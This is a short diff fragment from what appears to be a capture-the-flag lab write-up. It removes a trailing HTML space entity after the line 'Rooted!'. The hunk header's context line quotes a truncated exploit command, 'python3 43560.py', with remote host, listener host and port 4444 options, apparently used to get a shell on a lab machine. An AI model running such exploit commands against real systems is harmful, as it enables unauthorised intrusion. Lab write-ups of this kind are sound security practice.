@@ -85,4 +85,4 @@ python3 43560.py --rhost 10.129.85.96 --lhost 10.10.14.13 --lport 4444 --usernam
 
 <figure><img src="../../../.gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>
 
-Rooted!&#x20;
+Rooted!
